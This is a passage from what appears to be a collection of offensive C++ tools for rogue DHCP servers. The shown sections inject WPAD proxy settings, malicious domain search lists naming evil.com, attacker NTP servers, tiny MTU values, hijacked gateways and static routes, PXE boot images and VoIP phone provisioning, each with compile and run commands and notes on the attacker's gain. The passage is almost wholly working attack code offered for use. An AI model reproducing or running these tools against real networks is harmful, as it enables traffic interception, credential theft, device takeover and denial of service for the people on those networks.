        // Server ID
        packet[pos++] = 54; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 255;
        
        struct sockaddr_in broadcast;
        memset(&broadcast, 0, sizeof(broadcast));
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(68);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        
        sendto(sock, packet, pos, 0,
               (struct sockaddr*)&broadcast, sizeof(broadcast));
    }
    
    void run() {
        std::cout << "[*] DHCP WPAD injection\n";
        std::cout << "[*] WPAD URL: http://" << wpadIP << "/wpad.dat\n";
        
        uint8_t buffer[2048];
        
        while (true) {
            int bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
            if (bytes < 240) continue;
            
            if (buffer[0] == 1 && buffer[240] == 53 && buffer[242] == 1) {
                uint32_t xid = *(uint32_t*)(buffer + 4);
                uint8_t clientMAC[6];
                memcpy(clientMAC, buffer + 28, 6);
                
                std::cout << "[*] Sending WPAD-hijacked offer\n";
                sendWpadOffer(clientMAC, xid);
            }
        }
    }
    
    ~DHCPWpadInjection() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <interface> <wpad_server_ip>\n";
        return 1;
    }
    DHCPWpadInjection wpad(argv[2]);
    wpad.run();
    return 0;
}
```

**Technique:** DHCP WPAD (Web Proxy Auto-Discovery) injection via Option 252. Clients auto-configure to use attacker's proxy — intercept all HTTP/HTTPS. Used by Responder/PowerShell Empire.

---

### 8. DHCP with Custom Domain Search
```cpp
// Compile: g++ -o dhcp_domain dhcp_domain.cpp
// Run: sudo ./dhcp_domain <interface> <evil_domain>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DHCPDomainInjection {
private:
    int sock;
    std::string evilDomain;
    
public:
    DHCPDomainInjection(const std::string& d) : evilDomain(d) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(67);
        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    void sendDomainOffer(const uint8_t* clientMAC, uint32_t xid) {
        uint8_t packet[512];
        memset(packet, 0, sizeof(packet));
        
        packet[0] = 2;
        packet[1] = 1;
        packet[2] = 6;
        packet[3] = 0;
        *(uint32_t*)(packet + 4) = xid;
        
        struct in_addr clientIP;
        inet_pton(AF_INET, "192.168.1.100", &clientIP);
        *(uint32_t*)(packet + 16) = clientIP.s_addr;
        
        struct in_addr serverIP;
        inet_pton(AF_INET, "192.168.1.254", &serverIP);
        *(uint32_t*)(packet + 20) = serverIP.s_addr;
        
        memcpy(packet + 28, clientMAC, 6);
        
        packet[236] = 0x63;
        packet[237] = 0x82;
        packet[238] = 0x53;
        packet[239] = 0x63;
        
        int pos = 240;
        
        packet[pos++] = 53; packet[pos++] = 1; packet[pos++] = 2;
        
        packet[pos++] = 1; packet[pos++] = 4;
        struct in_addr mask;
        inet_pton(AF_INET, "255.255.255.0", &mask);
        memcpy(packet + pos, &mask.s_addr, 4); pos += 4;
        
        packet[pos++] = 3; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 6; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        // Domain name (option 15)
        packet[pos++] = 15;
        packet[pos++] = evilDomain.length();
        memcpy(packet + pos, evilDomain.c_str(), evilDomain.length());
        pos += evilDomain.length();
        
        // Domain search list (option 119) - RFC 3397 format
        // Format: length-prefixed domain names
        std::vector<uint8_t> searchList;
        for (const auto& dom : {evilDomain, "evil.com", "corp.local"}) {
            size_t start = 0, dot;
            while ((dot = dom.find('.', start)) != std::string::npos) {
                uint8_t len = dot - start;
                searchList.push_back(len);
                searchList.insert(searchList.end(), 
                                  dom.begin() + start, dom.begin() + dot);
                start = dot + 1;
            }
            uint8_t len = dom.length() - start;
            searchList.push_back(len);
            searchList.insert(searchList.end(),
                              dom.begin() + start, dom.end());
            searchList.push_back(0);
        }
        
        packet[pos++] = 119;
        packet[pos++] = searchList.size();
        memcpy(packet + pos, searchList.data(), searchList.size());
        pos += searchList.size();
        
        packet[pos++] = 54; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 255;
        
        struct sockaddr_in broadcast;
        memset(&broadcast, 0, sizeof(broadcast));
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(68);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        
        sendto(sock, packet, pos, 0,
               (struct sockaddr*)&broadcast, sizeof(broadcast));
    }
    
    void run() {
        std::cout << "[*] DHCP domain search injection\n";
        std::cout << "[*] Domain: " << evilDomain << "\n";
        
        uint8_t buffer[2048];
        
        while (true) {
            int bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
            if (bytes < 240) continue;
            
            if (buffer[0] == 1 && buffer[240] == 53 && buffer[242] == 1) {
                uint32_t xid = *(uint32_t*)(buffer + 4);
                uint8_t clientMAC[6];
                memcpy(clientMAC, buffer + 28, 6);
                
                std::cout << "[*] Injecting custom domain search\n";
                sendDomainOffer(clientMAC, xid);
            }
        }
    }
    
    ~DHCPDomainInjection() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <interface> <evil_domain>\n";
        return 1;
    }
    DHCPDomainInjection inject(argv[2]);
    inject.run();
    return 0;
}
```

**Technique:** Injects custom domain search list (Option 119) and default domain (Option 15). User typing "server" resolves to "server.evil.com" — enables NTLM credential theft.

---

### 9. DHCP with Custom NTP Server (Time Hijack)
```cpp
// Compile: g++ -o dhcp_ntp dhcp_ntp.cpp
// Run: sudo ./dhcp_ntp <interface> <ntp_server_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DHCPNtpInjection {
private:
    int sock;
    std::string ntpIP;
    
public:
    DHCPNtpInjection(const std::string& ip) : ntpIP(ip) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(67);
        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    void sendNtpOffer(const uint8_t* clientMAC, uint32_t xid) {
        uint8_t packet[512];
        memset(packet, 0, sizeof(packet));
        
        packet[0] = 2;
        packet[1] = 1;
        packet[2] = 6;
        packet[3] = 0;
        *(uint32_t*)(packet + 4) = xid;
        
        struct in_addr clientIP, serverIP;
        inet_pton(AF_INET, "192.168.1.100", &clientIP);
        *(uint32_t*)(packet + 16) = clientIP.s_addr;
        
        inet_pton(AF_INET, "192.168.1.254", &serverIP);
        *(uint32_t*)(packet + 20) = serverIP.s_addr;
        
        memcpy(packet + 28, clientMAC, 6);
        
        packet[236] = 0x63;
        packet[237] = 0x82;
        packet[238] = 0x53;
        packet[239] = 0x63;
        
        int pos = 240;
        
        packet[pos++] = 53; packet[pos++] = 1; packet[pos++] = 2;
        
        packet[pos++] = 1; packet[pos++] = 4;
        struct in_addr addr;
        inet_pton(AF_INET, "255.255.255.0", &addr);
        memcpy(packet + pos, &addr.s_addr, 4); pos += 4;
        
        packet[pos++] = 3; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 6; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        // NTP server (option 42)
        inet_pton(AF_INET, ntpIP.c_str(), &addr);
        packet[pos++] = 42;
        packet[pos++] = 4;
        memcpy(packet + pos, &addr.s_addr, 4); pos += 4;
        
        // NTP server (option 4 is time server - deprecated but sometimes used)
        packet[pos++] = 4;
        packet[pos++] = 4;
        memcpy(packet + pos, &addr.s_addr, 4); pos += 4;
        
        // Server ID
        packet[pos++] = 54; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 255;
        
        struct sockaddr_in broadcast;
        memset(&broadcast, 0, sizeof(broadcast));
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(68);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        
        sendto(sock, packet, pos, 0,
               (struct sockaddr*)&broadcast, sizeof(broadcast));
    }
    
    void run() {
        std::cout << "[*] DHCP NTP injection - time hijack\n";
        std::cout << "[*] Malicious NTP: " << ntpIP << "\n";
        
        uint8_t buffer[2048];
        
        while (true) {
            int bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
            if (bytes < 240) continue;
            
            if (buffer[0] == 1 && buffer[240] == 53 && buffer[242] == 1) {
                uint32_t xid = *(uint32_t*)(buffer + 4);
                uint8_t clientMAC[6];
                memcpy(clientMAC, buffer + 28, 6);
                
                std::cout << "[*] Injecting malicious NTP config\n";
                sendNtpOffer(clientMAC, xid);
            }
        }
    }
    
    ~DHCPNtpInjection() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <interface> <ntp_server_ip>\n";
        return 1;
    }
    DHCPNtpInjection inject(argv[2]);
    inject.run();
    return 0;
}
```

**Technique:** DHCP NTP hijack via Option 42. Client syncs time to attacker's NTP server. Breaks certificate validation (TLS), Kerberos auth, log correlation, and enables time-based attacks.

---

### 10. DHCP with MTU Reduction (DoS)
```cpp
// Compile: g++ -o dhcp_mtu dhcp_mtu.cpp
// Run: sudo ./dhcp_mtu <interface> <mtu_value>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DHCPMtuAttack {
private:
    int sock;
    uint16_t mtu;
    
public:
    DHCPMtuAttack(uint16_t m) : mtu(m) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(67);
        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    void sendMtuOffer(const uint8_t* clientMAC, uint32_t xid) {
        uint8_t packet[512];
        memset(packet, 0, sizeof(packet));
        
        packet[0] = 2;
        packet[1] = 1;
        packet[2] = 6;
        packet[3] = 0;
        *(uint32_t*)(packet + 4) = xid;
        
        struct in_addr clientIP, serverIP;
        inet_pton(AF_INET, "192.168.1.100", &clientIP);
        *(uint32_t*)(packet + 16) = clientIP.s_addr;
        
        inet_pton(AF_INET, "192.168.1.254", &serverIP);
        *(uint32_t*)(packet + 20) = serverIP.s_addr;
        
        memcpy(packet + 28, clientMAC, 6);
        
        packet[236] = 0x63;
        packet[237] = 0x82;
        packet[238] = 0x53;
        packet[239] = 0x63;
        
        int pos = 240;
        
        packet[pos++] = 53; packet[pos++] = 1; packet[pos++] = 2;
        
        packet[pos++] = 1; packet[pos++] = 4;
        struct in_addr mask;
        inet_pton(AF_INET, "255.255.255.0", &mask);
        memcpy(packet + pos, &mask.s_addr, 4); pos += 4;
        
        packet[pos++] = 3; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 6; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        // MTU (option 26) - tiny MTU causes fragmentation / DoS
        packet[pos++] = 26;
        packet[pos++] = 2;
        *(uint16_t*)(packet + pos) = htons(mtu);
        pos += 2;
        
        packet[pos++] = 54; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 255;
        
        struct sockaddr_in broadcast;
        memset(&broadcast, 0, sizeof(broadcast));
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(68);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        
        sendto(sock, packet, pos, 0,
               (struct sockaddr*)&broadcast, sizeof(broadcast));
    }
    
    void run() {
        std::cout << "[*] DHCP MTU reduction attack - MTU=" << mtu << "\n";
        
        uint8_t buffer[2048];
        
        while (true) {
            int bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
            if (bytes < 240) continue;
            
            if (buffer[0] == 1 && buffer[240] == 53 && buffer[242] == 1) {
                uint32_t xid = *(uint32_t*)(buffer + 4);
                uint8_t clientMAC[6];
                memcpy(clientMAC, buffer + 28, 6);
                
                std::cout << "[*] Sending tiny MTU offer\n";
                sendMtuOffer(clientMAC, xid);
            }
        }
    }
    
    ~DHCPMtuAttack() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <interface> <mtu_value>\n";
        return 1;
    }
    DHCPMtuAttack attack((uint16_t)atoi(argv[2]));
    attack.run();
    return 0;
}
```

**Technique:** DHCP MTU reduction via Option 26. Sets client's MTU to tiny value (e.g., 68), causing fragmentation, packet loss, and severe performance degradation. Subtle DoS.

---

### 11. DHCP with Multiple Router Options (Multi-Gateway)
```cpp
// Compile: g++ -o dhcp_multirouter dhcp_multirouter.cpp
// Run: sudo ./dhcp_multirouter <interface>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DHCPMultiRouter {
private:
    int sock;
    
public:
    DHCPMultiRouter() {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(67);
        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    void sendMultiRouterOffer(const uint8_t* clientMAC, uint32_t xid) {
        uint8_t packet[512];
        memset(packet, 0, sizeof(packet));
        
        packet[0] = 2;
        packet[1] = 1;
        packet[2] = 6;
        packet[3] = 0;
        *(uint32_t*)(packet + 4) = xid;
        
        struct in_addr clientIP, serverIP;
        inet_pton(AF_INET, "192.168.1.100", &clientIP);
        *(uint32_t*)(packet + 16) = clientIP.s_addr;
        
        inet_pton(AF_INET, "192.168.1.254", &serverIP);
        *(uint32_t*)(packet + 20) = serverIP.s_addr;
        
        memcpy(packet + 28, clientMAC, 6);
        
        packet[236] = 0x63;
        packet[237] = 0x82;
        packet[238] = 0x53;
        packet[239] = 0x63;
        
        int pos = 240;
        
        packet[pos++] = 53; packet[pos++] = 1; packet[pos++] = 2;
        
        packet[pos++] = 1; packet[pos++] = 4;
        struct in_addr mask;
        inet_pton(AF_INET, "255.255.255.0", &mask);
        memcpy(packet + pos, &mask.s_addr, 4); pos += 4;
        
        // Multiple routers - attacker first
        packet[pos++] = 3;
        packet[pos++] = 8;  // 2 IPs = 8 bytes
        struct in_addr router1, router2;
        inet_pton(AF_INET, "192.168.1.254", &router1);  // Attacker
        inet_pton(AF_INET, "192.168.1.1", &router2);    // Real gateway
        memcpy(packet + pos, &router1.s_addr, 4); pos += 4;
        memcpy(packet + pos, &router2.s_addr, 4); pos += 4;
        
        // Custom classless static route (option 121)
        // Force specific destinations through attacker
        packet[pos++] = 121;
        int routeOptStart = pos;
        pos++;  // Length placeholder
        
        // Route 0.0.0.0/0 via attacker
        packet[pos++] = 0;  // Prefix length
        // (No destination bits for /0)
        memcpy(packet + pos, &router1.s_addr, 4); pos += 4;
        
        // Route 10.0.0.0/8 via attacker
        packet[pos++] = 8;
        packet[pos++] = 10;
        memcpy(packet + pos, &router1.s_addr, 4); pos += 4;
        
        // Route 172.16.0.0/12 via attacker
        packet[pos++] = 12;
        packet[pos++] = 172;
        packet[pos++] = 16;
        memcpy(packet + pos, &router1.s_addr, 4); pos += 4;
        
        // Route 192.168.0.0/16 via attacker
        packet[pos++] = 16;
        packet[pos++] = 192;
        packet[pos++] = 168;
        memcpy(packet + pos, &router1.s_addr, 4); pos += 4;
        
        packet[routeOptStart] = pos - routeOptStart - 1;
        
        packet[pos++] = 54; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 255;
        
        struct sockaddr_in broadcast;
        memset(&broadcast, 0, sizeof(broadcast));
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(68);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        
        sendto(sock, packet, pos, 0,
               (struct sockaddr*)&broadcast, sizeof(broadcast));
    }
    
    void run() {
        std::cout << "[*] DHCP multi-router + classless static routes injection\n";
        std::cout << "[*] Forcing routes via attacker gateway\n";
        
        uint8_t buffer[2048];
        
        while (true) {
            int bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
            if (bytes < 240) continue;
            
            if (buffer[0] == 1 && buffer[240] == 53 && buffer[242] == 1) {
                uint32_t xid = *(uint32_t*)(buffer + 4);
                uint8_t clientMAC[6];
                memcpy(clientMAC, buffer + 28, 6);
                
                std::cout << "[*] Sending multi-router offer\n";
                sendMultiRouterOffer(clientMAC, xid);
            }
        }
    }
    
    ~DHCPMultiRouter() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <interface>\n";
        return 1;
    }
    DHCPMultiRouter attack;
    attack.run();
    return 0;
}
```

**Technique:** Injects multiple router options + classless static routes (Option 121). Forces specific traffic patterns through attacker. Bypasses simple "check gateway" defenses.

---

### 12. DHCP with Boot Filename Injection (PXE Hijack)
```cpp
// Compile: g++ -o dhcp_pxe dhcp_pxe.cpp
// Run: sudo ./dhcp_pxe <interface> <tftp_server_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DHCPPxeHijack {
private:
    int sock;
    std::string tftpIP;
    
public:
    DHCPPxeHijack(const std::string& ip) : tftpIP(ip) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(67);
        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    void sendPxeOffer(const uint8_t* clientMAC, uint32_t xid, bool isAck) {
        uint8_t packet[1024];
        memset(packet, 0, sizeof(packet));
        
        packet[0] = 2;
        packet[1] = 1;
        packet[2] = 6;
        packet[3] = 0;
        *(uint32_t*)(packet + 4) = xid;
        
        struct in_addr clientIP, serverIP, tftpAddr;
        inet_pton(AF_INET, "192.168.1.100", &clientIP);
        *(uint32_t*)(packet + 16) = clientIP.s_addr;
        
        inet_pton(AF_INET, tftpIP.c_str(), &tftpAddr);
        *(uint32_t*)(packet + 20) = tftpAddr.s_addr;  // siaddr = TFTP server
        
        inet_pton(AF_INET, "192.168.1.254", &serverIP);
        *(uint32_t*)(packet + 20 + 0) = tftpAddr.s_addr;
        
        memcpy(packet + 28, clientMAC, 6);
        
        // Boot filename (128 bytes at offset 108)
        const char* bootfile = "pxelinux.0";
        strncpy((char*)(packet + 108), bootfile, 127);
        
        // Server name (64 bytes at offset 44)
        const char* servername = "pxe-attacker";
        strncpy((char*)(packet + 44), servername, 63);
        
        packet[236] = 0x63;
        packet[237] = 0x82;
        packet[238] = 0x53;
        packet[239] = 0x63;
        
        int pos = 240;
        
        packet[pos++] = 53; packet[pos++] = 1; packet[pos++] = isAck ? 5 : 2;
        
        packet[pos++] = 1; packet[pos++] = 4;
        struct in_addr mask;
        inet_pton(AF_INET, "255.255.255.0", &mask);
        memcpy(packet + pos, &mask.s_addr, 4); pos += 4;
        
        packet[pos++] = 3; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        // Option 66: TFTP server name
        const char* tftpName = "pxe-attacker";
        packet[pos++] = 66;
        packet[pos++] = strlen(tftpName);
        memcpy(packet + pos, tftpName, strlen(tftpName));
        pos += strlen(tftpName);
        
        // Option 67: Bootfile name
        packet[pos++] = 67;
        packet[pos++] = strlen(bootfile);
        memcpy(packet + pos, bootfile, strlen(bootfile));
        pos += strlen(bootfile);
        
        // Option 60: Vendor class identifier (PXEClient)
        const char* vendorClass = "PXEClient";
        packet[pos++] = 60;
        packet[pos++] = strlen(vendorClass);
        memcpy(packet + pos, vendorClass, strlen(vendorClass));
        pos += strlen(vendorClass);
        
        // Option 43: Vendor-specific (PXE)
        const uint8_t pxeOptions[] = {
            0x06, 0x01, 0x08,  // PXE discovery control
            0x0a, 0x04, 0x00, 0x00, 0x00, 0x00,  // Menu
        };
        packet[pos++] = 43;
        packet[pos++] = sizeof(pxeOptions);
        memcpy(packet + pos, pxeOptions, sizeof(pxeOptions));
        pos += sizeof(pxeOptions);
        
        packet[pos++] = 54; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 255;
        
        struct sockaddr_in broadcast;
        memset(&broadcast, 0, sizeof(broadcast));
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(68);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        
        sendto(sock, packet, pos, 0,
               (struct sockaddr*)&broadcast, sizeof(broadcast));
    }
    
    void run() {
        std::cout << "[*] DHCP PXE boot hijack\n";
        std::cout << "[*] TFTP server: " << tftpIP << "\n";
        std::cout << "[*] Bootfile: pxelinux.0\n";
        
        uint8_t buffer[2048];
        
        while (true) {
            int bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
            if (bytes < 240) continue;
            
            // Check for PXE clients (Vendor Class ID = PXEClient)
            bool isPxe = false;
            int checkPos = 240;
            while (checkPos < bytes && buffer[checkPos] != 255) {
                uint8_t code = buffer[checkPos];
                uint8_t len = buffer[checkPos + 1];
                if (code == 60 && len >= 9) {
                    if (memcmp(buffer + checkPos + 2, "PXEClient", 9) == 0) {
                        isPxe = true;
                    }
                }
                checkPos += 2 + len;
            }
            
            if (buffer[0] == 1 && buffer[240] == 53) {
                uint8_t msgType = buffer[242];
                if (isPxe && (msgType == 1 || msgType == 3)) {
                    uint32_t xid = *(uint32_t*)(buffer + 4);
                    uint8_t clientMAC[6];
                    memcpy(clientMAC, buffer + 28, 6);
                    
                    std::cout << "[*] PXE client detected - hijacking boot\n";
                    sendPxeOffer(clientMAC, xid, msgType == 3);
                }
            }
        }
    }
    
    ~DHCPPxeHijack() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <interface> <tftp_server_ip>\n";
        return 1;
    }
    DHCPPxeHijack pxe(argv[2]);
    pxe.run();
    return 0;
}
```

**Technique:** DHCP PXE boot hijack via Options 66/67 + PXE vendor options. Rogue TFTP server delivers malicious boot image — full system takeover at boot time.

---

### 13. DHCP for VoIP Phones (SIP Server Hijack)
```cpp
// Compile: g++ -o dhcp_voip dhcp_voip.cpp
// Run: sudo ./dhcp_voip <interface> <sip_server_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DHCPVoIPHijack {
private:
    int sock;
    std::string sipServer;
    
public:
    DHCPVoIPHijack(const std::string& ip) : sipServer(ip) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(67);
        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    void sendVoipOffer(const uint8_t* clientMAC, uint32_t xid) {
        uint8_t packet[1024];
        memset(packet, 0, sizeof(packet));
        
        packet[0] = 2;
        packet[1] = 1;
        packet[2] = 6;
        packet[3] = 0;
        *(uint32_t*)(packet + 4) = xid;
        
        struct in_addr clientIP, serverIP, sipAddr;
        inet_pton(AF_INET, "192.168.1.100", &clientIP);
        *(uint32_t*)(packet + 16) = clientIP.s_addr;
        
        inet_pton(AF_INET, "192.168.1.254", &serverIP);
        *(uint32_t*)(packet + 20) = serverIP.s_addr;
        
        inet_pton(AF_INET, sipServer.c_str(), &sipAddr);
        
        memcpy(packet + 28, clientMAC, 6);
        
        packet[236] = 0x63;
        packet[237] = 0x82;
        packet[238] = 0x53;
        packet[239] = 0x63;
        
        int pos = 240;
        
        packet[pos++] = 53; packet[pos++] = 1; packet[pos++] = 2;
        
        packet[pos++] = 1; packet[pos++] = 4;
        struct in_addr mask;
        inet_pton(AF_INET, "255.255.255.0", &mask);
        memcpy(packet + pos, &mask.s_addr, 4); pos += 4;
        
        packet[pos++] = 3; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        // Cisco VoIP specific options
        // Option 150: TFTP server (Cisco phones)
        packet[pos++] = 150;
        packet[pos++] = 4;
        memcpy(packet + pos, &sipAddr.s_addr, 4); pos += 4;
        
        // Option 66: TFTP server name
        const char* tftpName = "voip-attacker";
        packet[pos++] = 66;
        packet[pos++] = strlen(tftpName);
        memcpy(packet + pos, tftpName, strlen(tftpName));
        pos += strlen(tftpName);
        
        // Option 42: NTP
        packet[pos++] = 42;
        packet[pos++] = 4;
        memcpy(packet + pos, &sipAddr.s_addr, 4); pos += 4;
        
        // Option 43: Vendor-specific (Cisco)
        // Format: sub-option code, length, data
        std::vector<uint8_t> ciscoOpts;
        
        // Sub-option 1: TFTP server IP
        ciscoOpts.push_back(1);
        ciscoOpts.push_back(4);
        ciscoOpts.insert(ciscoOpts.end(), (uint8_t*)&sipAddr.s_addr, 
                        (uint8_t*)&sipAddr.s_addr + 4);
        
        packet[pos++] = 43;
        packet[pos++] = ciscoOpts.size();
        memcpy(packet + pos, ciscoOpts.data(), ciscoOpts.size());
        pos += ciscoOpts.size();
        
        // Option 54: Server ID
        packet[pos++] = 54; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 255;
        
        struct sockaddr_in broadcast;
        memset(&broadcast, 0, sizeof(broadcast));
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(68);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        
        sendto(sock, packet, pos, 0,
               (struct sockaddr*)&broadcast, sizeof(broadcast));
    }
    
    void run() {
        std::cout << "[*] DHCP VoIP/SIP server hijack\n";
        std::cout << "[*] Malicious SIP/TFTP: " << sipServer << "\n";
        
        uint8_t buffer[2048];
        
        while (true) {
            int bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
            if (bytes < 240) continue;
            
            // Detect VoIP phones via vendor class or MAC OUI
            bool isVoip = false;
            
            // Check for Cisco/Snom/Yealink OUIs
            uint8_t oui[3] = {buffer[28], buffer[29], buffer[30]};
            // Cisco: 00:1B:xx, 00:1E:xx; Yealink: 80:5E:xx; Snom: 00:04:13
            if ((oui[0] == 0x00 && (oui[1] == 0x1B || oui[1] == 0x1E)) ||
                (oui[0] == 0x80 && oui[1] == 0x5E) ||
                (oui[0] == 0x00 && oui[1] == 0x04 && oui[2] == 0x13)) {
                isVoip = true;
            }
            
            // Also check vendor class
            int checkPos = 240;
            while (checkPos < bytes && buffer[checkPos] != 255) {
                uint8_t code = buffer[checkPos];
                uint8_t len = buffer[checkPos + 1];
                if (code == 60) {
                    if (memmem(buffer + checkPos + 2, len, "Cisco", 5) ||
                        memmem(buffer + checkPos + 2, len, "Yealink", 7)) {
                        isVoip = true;
                    }
                }
                checkPos += 2 + len;
            }
            
            if (buffer[0] == 1 && buffer[240] == 53 && buffer[242] == 1) {
                if (isVoip) {
                    uint32_t xid = *(uint32_t*)(buffer + 4);
                    uint8_t clientMAC[6];
                    memcpy(clientMAC, buffer + 28, 6);
                    
                    std::cout << "[*] VoIP phone detected - hijacking\n";
                    sendVoipOffer(clientMAC, xid);
                }
            }
        }
    }
    
    ~DHCPVoIPHijack() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <interface> <sip_server_ip>\n";
        return 1;
    }
    DHCPVoIPHijack voip(argv[2]);
    voip.run();
    return 0;
}
